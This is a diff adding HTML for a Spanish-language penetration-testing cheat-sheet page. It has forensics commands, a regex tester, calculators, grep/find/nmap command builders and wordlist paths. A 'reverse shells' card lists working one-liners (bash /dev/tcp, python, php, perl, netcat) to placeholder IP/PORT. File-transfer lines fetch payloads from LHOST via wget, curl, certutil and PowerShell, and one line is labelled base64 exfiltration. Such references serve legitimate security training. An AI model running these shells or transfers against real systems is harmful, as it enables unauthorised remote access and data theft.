+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">disk &amp; logs forensics</span><span class="cmd-card-desc">análisis de disco</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">dd if=/dev/sda of=disk.img bs=4M status=progress</span><span class="cmd-comment">imagen de disco</span></div>
+        <div class="cmd-item"><span class="cmd-code">md5sum disk.img > disk.md5</span><span class="cmd-comment">hash integridad</span></div>
+        <div class="cmd-item"><span class="cmd-code">mount -o loop,ro disk.img /mnt</span><span class="cmd-comment">montar imagen</span></div>
+        <div class="cmd-item"><span class="cmd-code">fls -r disk.img</span><span class="cmd-comment">listar ficheros (sleuthkit)</span></div>
+        <div class="cmd-item"><span class="cmd-code">icat disk.img INODE > file</span><span class="cmd-comment">extraer por inode</span></div>
+        <div class="cmd-item"><span class="cmd-code">last -F</span><span class="cmd-comment">logins histórico</span></div>
+        <div class="cmd-item"><span class="cmd-code">lastb</span><span class="cmd-comment">intentos fallidos</span></div>
+        <div class="cmd-item"><span class="cmd-code">ausearch -i -m USER_LOGIN</span><span class="cmd-comment">auditd logins</span></div>
+        <div class="cmd-item"><span class="cmd-code">journalctl -u sshd --since "1 hour ago"</span><span class="cmd-comment">logs SSH</span></div>
+        <div class="cmd-item"><span class="cmd-code">grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn</span><span class="cmd-comment">IPs atacantes</span></div>
+        <div class="cmd-item"><span class="cmd-code">find / -atime -1 2>/dev/null</span><span class="cmd-comment">accedidos &lt;1h</span></div>
+      </div>
+    </div>
+
+  </div>
+</section>
+<!-- ═══════════════════════════════════════════
+     REGEX TESTER
+═══════════════════════════════════════════ -->
+<section id="regex">
+  <div class="section-header"><h2>// regex tester</h2><span class="section-tag tag-g">live · highlights · presets</span></div>
+  <div class="tool-panel" style="max-width:960px">
+    <div style="display:flex;gap:.5rem;margin-bottom:.5rem;flex-wrap:wrap">
+      <input type="text" id="rx-p" placeholder="Regex pattern..." style="flex:2;min-width:200px" oninput="runRx()">
+      <input type="text" id="rx-f" value="gm" style="width:65px" placeholder="flags" oninput="runRx()">
+      <select id="rx-preset" onchange="loadRxP()" style="flex:1;min-width:180px">
+        <option value="">— Presets —</option>
+        <option value="ip">IPv4 Address</option>
+        <option value="ip6">IPv6 Address</option>
+        <option value="cidr">CIDR notation</option>
+        <option value="email">Email</option>
+        <option value="url">URL</option>
+        <option value="mac">MAC Address</option>
+        <option value="jwt">JWT Token</option>
+        <option value="b64">Base64 string</option>
+        <option value="hash32">MD5/Hash 32</option>
+        <option value="hash40">SHA1/Hash 40</option>
+        <option value="hash64">SHA256/Hash 64</option>
+        <option value="cve">CVE ID</option>
+        <option value="privkey">Private key block</option>
+        <option value="winpath">Windows path</option>
+        <option value="unixpath">Unix path</option>
+        <option value="sqlstr">SQL string literal</option>
+        <option value="xss">XSS pattern</option>
+        <option value="ssn">Social Security Number</option>
+        <option value="cc">Credit card</option>
+      </select>
+    </div>
+    <textarea id="rx-t" style="min-height:110px" placeholder="Texto de prueba..." oninput="runRx()">192.168.1.1 y tambien 10.0.0.254
+admin@example.com y root@hack.local
+JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.cGF5bG9hZA.sig
+MAC: 00:11:22:33:44:55 y AA-BB-CC-DD-EE-FF
+CVE-2021-44228 Log4Shell - CVSS 10.0
+SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</textarea>
+    <div style="display:flex;gap:1rem;align-items:center;margin:.4rem 0;font-size:12px;font-family:var(--mono)">
+      <span id="rx-count" style="color:var(--green)">0 matches</span>
+      <span id="rx-err" style="color:var(--red)"></span>
+    </div>
+    <div class="out" id="rx-out" style="min-height:80px;white-space:pre-wrap;overflow-y:auto;max-height:250px">resultado</div>
+  </div>
+</section>
+<!-- ═══════════════════════════════════════════
+     MISC TOOLS
+═══════════════════════════════════════════ -->
+<section id="misc">
+  <div class="section-header"><h2>// misc tools</h2><span class="section-tag tag-c">permisos · subred · cron · timestamp</span></div>
+  <div class="tools-grid">
+
+    <!-- PERMISOS -->
+    <div class="tool-panel">
+      <h3>Calculadora permisos Unix</h3>
+      <div class="perms-grid">
+        <div class="perm-group"><div class="perm-group-label">owner (u)</div><div class="perm-checks"><div class="perm-check"><input type="checkbox" id="ur" checked onchange="calcP()"><label for="ur">r</label></div><div class="perm-check"><input type="checkbox" id="uw" checked onchange="calcP()"><label for="uw">w</label></div><div class="perm-check"><input type="checkbox" id="ux" onchange="calcP()"><label for="ux">x</label></div></div></div>
+        <div class="perm-group"><div class="perm-group-label">group (g)</div><div class="perm-checks"><div class="perm-check"><input type="checkbox" id="gr" checked onchange="calcP()"><label for="gr">r</label></div><div class="perm-check"><input type="checkbox" id="gw" onchange="calcP()"><label for="gw">w</label></div><div class="perm-check"><input type="checkbox" id="gx" onchange="calcP()"><label for="gx">x</label></div></div></div>
+        <div class="perm-group"><div class="perm-group-label">others (o)</div><div class="perm-checks"><div class="perm-check"><input type="checkbox" id="or2" checked onchange="calcP()"><label for="or2">r</label></div><div class="perm-check"><input type="checkbox" id="ow2" onchange="calcP()"><label for="ow2">w</label></div><div class="perm-check"><input type="checkbox" id="ox2" onchange="calcP()"><label for="ox2">x</label></div></div></div>
+      </div>
+      <div class="perm-octal" id="p-oct">644</div>
+      <div class="perm-symbolic" id="p-sym">-rw-r--r--</div>
+      <div style="text-align:center;font-family:var(--mono);font-size:11px;color:var(--text-muted);margin-top:4px" id="p-cmd">chmod 644 fichero</div>
+    </div>
+
+    <!-- SUBNET -->
+    <div class="tool-panel">
+      <h3>Calculadora de subred <span>IPv4</span></h3>
+      <div class="tool-row">
+        <input type="text" id="sn-in" value="192.168.1.0/24" style="flex:1">
+        <button class="tbtn" onclick="calcSN()">Calcular</button>
+      </div>
+      <div id="sn-out"></div>
+    </div>
+
+    <!-- CRON -->
+    <div class="tool-panel">
+      <h3>Cron builder <span>5 campos</span></h3>
+      <div class="cron-fields">
+        <div class="cron-field"><label>min</label><input type="text" id="cr-min" value="0" oninput="buildCron()"></div>
+        <div class="cron-field"><label>hora</label><input type="text" id="cr-hr" value="*" oninput="buildCron()"></div>
+        <div class="cron-field"><label>dia mes</label><input type="text" id="cr-dm" value="*" oninput="buildCron()"></div>
+        <div class="cron-field"><label>mes</label><input type="text" id="cr-mo" value="*" oninput="buildCron()"></div>
+        <div class="cron-field"><label>dia sem</label><input type="text" id="cr-dw" value="*" oninput="buildCron()"></div>
+      </div>
+      <div class="cron-result" id="cr-expr">0 * * * *</div>
+      <div class="cron-desc" id="cr-desc"></div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:3px;margin-top:.5rem">
+        <button class="tbtn c" onclick="setCron('0 * * * *')">Cada hora</button>
+        <button class="tbtn c" onclick="setCron('0 0 * * *')">Medianoche</button>
+        <button class="tbtn c" onclick="setCron('*/5 * * * *')">Cada 5 min</button>
+        <button class="tbtn c" onclick="setCron('0 0 * * 1')">Cada lunes</button>
+        <button class="tbtn c" onclick="setCron('0 */6 * * *')">Cada 6h</button>
+        <button class="tbtn c" onclick="setCron('0 0 1 * *')">Mensual</button>
+      </div>
+    </div>
+
+    <!-- TIMESTAMP -->
+    <div class="tool-panel">
+      <h3>Timestamp converter <span>Unix ↔ fecha</span></h3>
+      <div class="tool-row">
+        <input type="text" id="ts-in" placeholder="Unix ts o fecha ISO..." style="flex:1">
+        <button class="tbtn" onclick="tsConv()">Convertir</button>
+        <button class="tbtn c" onclick="tsNow()">Now</button>
+      </div>
+      <div class="out dim" id="ts-out">resultado</div>
+    </div>
+
+    <!-- CIDR / IP TOOLS -->
+    <div class="tool-panel">
+      <h3>IP range expander <span>CIDR → lista</span></h3>
+      <div class="tool-row">
+        <input type="text" id="ip-range" placeholder="192.168.1.0/28" style="flex:1">
+        <button class="tbtn" onclick="expandCIDR()">Expandir</button>
+      </div>
+      <div class="out dim" id="ip-out">resultado</div>
+    </div>
+
+  </div>
+</section>
+<!-- ═══════════════════════════════════════════
+     PAYLOADS / FILE TRANSFER / REFERENCE
+═══════════════════════════════════════════ -->
+<section id="payloads">
+  <div class="section-header"><h2>// transferencia &amp; referencia rápida</h2><span class="section-tag tag-r">file transfer · reverse shells (ref)</span></div>
+  <div class="cards-grid">
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">file transfer</span><span class="cmd-card-desc">subir / bajar ficheros</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">python3 -m http.server SRVPORT</span><span class="cmd-comment">servidor HTTP</span></div>
+        <div class="cmd-item"><span class="cmd-code">php -S 0.0.0.0:SRVPORT</span><span class="cmd-comment">servidor PHP</span></div>
+        <div class="cmd-item"><span class="cmd-code">ruby -run -e httpd . -p SRVPORT</span><span class="cmd-comment">servidor Ruby</span></div>
+        <div class="cmd-item"><span class="cmd-code">wget http://LHOST:SRVPORT/LFILE -O /tmp/LFILE</span><span class="cmd-comment">descargar wget</span></div>
+        <div class="cmd-item"><span class="cmd-code">curl http://LHOST:SRVPORT/LFILE -o /tmp/LFILE</span><span class="cmd-comment">descargar curl</span></div>
+        <div class="cmd-item"><span class="cmd-code">certutil -urlcache -f http://LHOST:SRVPORT/LFILE LFILE</span><span class="cmd-comment">descargar (Windows)</span></div>
+        <div class="cmd-item"><span class="cmd-code">powershell -c "iwr http://LHOST:SRVPORT/LFILE -OutFile LFILE"</span><span class="cmd-comment">descargar (PS)</span></div>
+        <div class="cmd-item"><span class="cmd-code">base64 LFILE | tr -d '\n'; echo</span><span class="cmd-comment">exfil b64 terminal</span></div>
+        <div class="cmd-item"><span class="cmd-code">cat LFILE | base64 -d > LFILE.out</span><span class="cmd-comment">decode b64</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">scp · sftp · rsync</span><span class="cmd-card-desc">transferencia sobre SSH</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">scp LFILE USER@RHOST:/tmp/</span><span class="cmd-comment">subir fichero</span></div>
+        <div class="cmd-item"><span class="cmd-code">scp USER@RHOST:/etc/passwd /tmp/</span><span class="cmd-comment">bajar fichero</span></div>
+        <div class="cmd-item"><span class="cmd-code">scp -r dir/ USER@RHOST:/tmp/</span><span class="cmd-comment">subir directorio</span></div>
+        <div class="cmd-item"><span class="cmd-code">scp -P 2222 LFILE USER@RHOST:/tmp/</span><span class="cmd-comment">puerto SSH alt</span></div>
+        <div class="cmd-item"><span class="cmd-code">scp -i id_rsa LFILE USER@RHOST:/tmp/</span><span class="cmd-comment">con clave privada</span></div>
+        <div class="cmd-item"><span class="cmd-code">scp -o StrictHostKeyChecking=no LFILE USER@RHOST:/tmp/</span><span class="cmd-comment">skip host check</span></div>
+        <div class="cmd-item"><span class="cmd-code">scp -J USER@jump USER@RHOST:/tmp/LFILE .</span><span class="cmd-comment">via jump host</span></div>
+        <div class="cmd-item"><span class="cmd-code">sftp USER@RHOST</span><span class="cmd-comment">sesión SFTP interactiva</span></div>
+        <div class="cmd-item"><span class="cmd-code">rsync -avz LFILE USER@RHOST:/tmp/</span><span class="cmd-comment">subir (rsync)</span></div>
+        <div class="cmd-item"><span class="cmd-code">rsync -avz USER@RHOST:/path/ ./loot/</span><span class="cmd-comment">bajar (rsync)</span></div>
+        <div class="cmd-item"><span class="cmd-code">rsync -avz -e "ssh -p 2222" dir/ USER@RHOST:/tmp/</span><span class="cmd-comment">rsync puerto alt</span></div>
+        <div class="cmd-item"><span class="cmd-code">rsync -avz --progress dir/ USER@RHOST:/tmp/</span><span class="cmd-comment">con progreso</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">reverse shells</span><span class="cmd-card-desc">referencia de sintaxis (placeholders IP/PORT)</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">bash -i >& /dev/tcp/IP/PORT 0>&1</span><span class="cmd-comment">bash</span></div>
+        <div class="cmd-item"><span class="cmd-code">sh -i >& /dev/tcp/IP/PORT 0>&1</span><span class="cmd-comment">sh</span></div>
+        <div class="cmd-item"><span class="cmd-code">python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),i) for i in range(3)];subprocess.call(["/bin/sh","-i"])'</span><span class="cmd-comment">python3</span></div>
+        <div class="cmd-item"><span class="cmd-code">php -r '$s=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'</span><span class="cmd-comment">php</span></div>
+        <div class="cmd-item"><span class="cmd-code">perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(PORT,inet_aton("IP")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'</span><span class="cmd-comment">perl</span></div>
+        <div class="cmd-item"><span class="cmd-code">nc -e /bin/sh IP PORT</span><span class="cmd-comment">netcat (-e variant)</span></div>
+        <div class="cmd-item"><span class="cmd-code">python3 -c 'import pty; pty.spawn("/bin/bash")'</span><span class="cmd-comment">upgrade shell (1)</span></div>
+        <div class="cmd-item"><span class="cmd-code">export TERM=xterm; stty raw -echo; fg</span><span class="cmd-comment">upgrade shell (2)</span></div>
+        <div class="cmd-item"><span class="cmd-code">stty rows 50 cols 200</span><span class="cmd-comment">fix tamaño TTY</span></div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- COMMAND BUILDER -->
+  <div style="margin-top:1.5rem">
+    <div class="section-header"><h2>// command builder</h2><span class="section-tag tag-g">genera comandos interactivamente</span></div>
+    <div class="tools-grid">
+
+      <!-- GREP BUILDER -->
+      <div class="tool-panel">
+        <h3>grep builder</h3>
+        <div class="tool-row">
+          <input type="text" id="gb-pattern" placeholder="patrón a buscar" style="flex:2">
+          <input type="text" id="gb-path" placeholder="ruta (def: .)" style="flex:1">
+        </div>
+        <div class="tool-row" style="flex-wrap:wrap;gap:.6rem">
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="gb-r"> -r recursivo</label>
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="gb-i"> -i case-insens</label>
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="gb-v"> -v invertir</label>
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="gb-n"> -n nº línea</label>
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="gb-E"> -E regex ext</label>
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="gb-o"> -o solo match</label>
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="gb-c"> -c contar</label>
+        </div>
+        <div class="tool-row">
+          <button class="tbtn" onclick="buildGrep()">Generar</button>
+        </div>
+        <div class="out dim" id="gb-out">comando aquí</div>
+      </div>
+
+      <!-- FIND BUILDER -->
+      <div class="tool-panel">
+        <h3>find builder</h3>
+        <div class="tool-row">
+          <input type="text" id="fb-path" placeholder="ruta (def: .)" style="flex:1">
+          <input type="text" id="fb-name" placeholder="-name patrón (ej: *.conf)" style="flex:1">
+        </div>
+        <div class="tool-row" style="flex-wrap:wrap;gap:.6rem">
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="fb-suid"> SUID (-perm -4000)</label>
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="fb-sgid"> SGID (-perm -2000)</label>
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="fb-writable"> -writable</label>
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="fb-type-f"> -type f</label>
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="fb-stderr"> 2>/dev/null</label>
+        </div>
+        <div class="tool-row">
+          <input type="text" id="fb-mmin" placeholder="-mmin (ej: -60)" style="flex:1">
+          <input type="text" id="fb-user" placeholder="-user (ej: root)" style="flex:1">
+        </div>
+        <div class="tool-row">
+          <button class="tbtn" onclick="buildFind()">Generar</button>
+        </div>
+        <div class="out dim" id="fb-out">comando aquí</div>
+      </div>
+
+      <!-- SED BUILDER -->
+      <div class="tool-panel">
+        <h3>sed builder</h3>
+        <div class="tool-row">
+          <input type="text" id="sb-find" placeholder="buscar" style="flex:1">
+          <input type="text" id="sb-replace" placeholder="reemplazar" style="flex:1">
+        </div>
+        <div class="tool-row">
+          <input type="text" id="sb-file" placeholder="fichero" style="flex:1">
+        </div>
+        <div class="tool-row" style="flex-wrap:wrap;gap:.6rem">
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="sb-g" checked> -g global</label>
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="sb-i"> -i in-place</label>
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="sb-case"> case-insens (I)</label>
+        </div>
+        <div class="tool-row">
+          <button class="tbtn" onclick="buildSed()">Generar</button>
+        </div>
+        <div class="out dim" id="sb-out">comando aquí</div>
+      </div>
+
+      <!-- NMAP BUILDER -->
+      <div class="tool-panel">
+        <h3>nmap builder</h3>
+        <div class="tool-row">
+          <input type="text" id="nb-target" placeholder="target (IP / rango / dominio)" style="flex:1">
+          <input type="text" id="nb-ports" placeholder="-p puertos (opcional)" style="flex:1">
+        </div>
+        <div class="tool-row" style="flex-wrap:wrap;gap:.6rem">
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="nb-sV" checked> -sV versiones</label>
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="nb-sC" checked> -sC scripts default</label>
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="nb-allports"> -p- todos los puertos</label>
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="nb-A"> -A agresivo</label>
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="nb-Pn"> -Pn sin ping</label>
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="nb-sU"> -sU UDP</label>
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="nb-vuln"> --script vuln</label>
+          <label style="font-size:11px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="nb-oA"> -oA scan (guardar)</label>
+        </div>
+        <div class="tool-row">
+          <select id="nb-rate" style="flex:1">
+            <option value="">Rate normal</option>
+            <option value="--min-rate 1000">--min-rate 1000</option>
+            <option value="--min-rate 5000">--min-rate 5000</option>
+            <option value="-T4">-T4 agresivo</option>
+            <option value="-T5">-T5 insano</option>
+          </select>
+          <button class="tbtn" onclick="buildNmap()">Generar</button>
+        </div>
+        <div class="out dim" id="nb-out">comando aquí</div>
+      </div>
+
+    </div>
+  </div>
+</section>
+<!-- ═══════════════════════════════════════════
+     WORDLISTS
+═══════════════════════════════════════════ -->
+<section id="wordlists">
+  <div class="section-header"><h2>// wordlists</h2><span class="section-tag tag-g">seclist · rockyou · paths comunes</span></div>
+  <div class="tools-grid">
+
+    <div class="tool-panel">
+      <h3>SecLists — paths comunes</h3>
+      <div class="wl-list">
+        <div class="wl-item"><span class="wl-path">/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt</span><span class="wl-desc">rockyou</span><button class="wl-copy" onclick="copyText('/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt')">copy</button></div>
+        <div class="wl-item"><span class="wl-path">/usr/share/wordlists/rockyou.txt</span><span class="wl-desc">rockyou (kali)</span><button class="wl-copy" onclick="copyText('/usr/share/wordlists/rockyou.txt')">copy</button></div>
+        <div class="wl-item"><span class="wl-path">/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><span class="wl-desc">dirs medium</span><button class="wl-copy" onclick="copyText('/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt')">copy</button></div>
+        <div class="wl-item"><span class="wl-path">/usr/share/seclists/Discovery/Web-Content/common.txt</span><span class="wl-desc">dirs common</span><button class="wl-copy" onclick="copyText('/usr/share/seclists/Discovery/Web-Content/common.txt')">copy</button></div>
+        <div class="wl-item"><span class="wl-path">/usr/share/seclists/Discovery/Web-Content/big.txt</span><span class="wl-desc">dirs big</span><button class="wl-copy" onclick="copyText('/usr/share/seclists/Discovery/Web-Content/big.txt')">copy</button></div>
+        <div class="wl-item"><span class="wl-path">/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span><span class="wl-desc">subdomains 5k</span><button class="wl-copy" onclick="copyText('/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt')">copy</button></div>
+        <div class="wl-item"><span class="wl-path">/usr/share/seclists/Usernames/top-usernames-shortlist.txt</span><span class="wl-desc">usernames</span><button class="wl-copy" onclick="copyText('/usr/share/seclists/Usernames/top-usernames-shortlist.txt')">copy</button></div>
+        <div class="wl-item"><span class="wl-path">/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt</span><span class="wl-desc">top passwords 1k</span><button class="wl-copy" onclick="copyText('/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt')">copy</button></div>
+        <div class="wl-item"><span class="wl-path">/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt</span><span class="wl-desc">SQLi fuzzing</span><button class="wl-copy" onclick="copyText('/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt')">copy</button></div>
+        <div class="wl-item"><span class="wl-path">/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt</span><span class="wl-desc">XSS fuzzing</span><button class="wl-copy" onclick="copyText('/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt')">copy</button></div>
+        <div class="wl-item"><span class="wl-path">/usr/share/metasploit-framework/data/wordlists/</span><span class="wl-desc">MSF wordlists</span><button class="wl-copy" onclick="copyText('/usr/share/metasploit-framework/data/wordlists/')">copy</button></div>
+      </div>
+    </div>
+
+    <div class="tool-panel">
+      <h3>Comandos de instalación rápida</h3>
+      <div class="cmd-list" style="background:var(--bg3);border-radius:4px;margin-top:.25rem">
+        <div class="cmd-item"><span class="cmd-code">git clone https://github.com/danielmiessler/SecLists</span><span class="cmd-comment">SecLists</span></div>
+        <div class="cmd-item"><span class="cmd-code">apt install seclists wordlists -y</span><span class="cmd-comment">apt install</span></div>
+        <div class="cmd-item"><span class="cmd-code">pip install impacket</span><span class="cmd-comment">impacket</span></div>
+        <div class="cmd-item"><span class="cmd-code">go install github.com/OJ/gobuster/v3@latest</span><span class="cmd-comment">gobuster</span></div>
+        <div class="cmd-item"><span class="cmd-code">go install github.com/ffuf/ffuf/v2@latest</span><span class="cmd-comment">ffuf</span></div>
+        <div class="cmd-item"><span class="cmd-code">cargo install feroxbuster</span><span class="cmd-comment">feroxbuster</span></div>
+        <div class="cmd-item"><span class="cmd-code">searchsploit -u</span><span class="cmd-comment">actualizar ExploitDB local</span></div>
+        <div class="cmd-item"><span class="cmd-code">searchsploit apache 2.4</span><span class="cmd-comment">buscar exploits locales</span></div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+</main>
+
+<script src="js/search.js"></script>
+<script src="js/encoders.js"></script>
+<script src="js/regex.js"></script>
+<script src="js/misctools.js"></script>
+<script src="js/cmdbuilders.js"></script>
+<script src="js/app.js"></script>
+<script src="js/vars.js"></script>
+</body>
+</html>
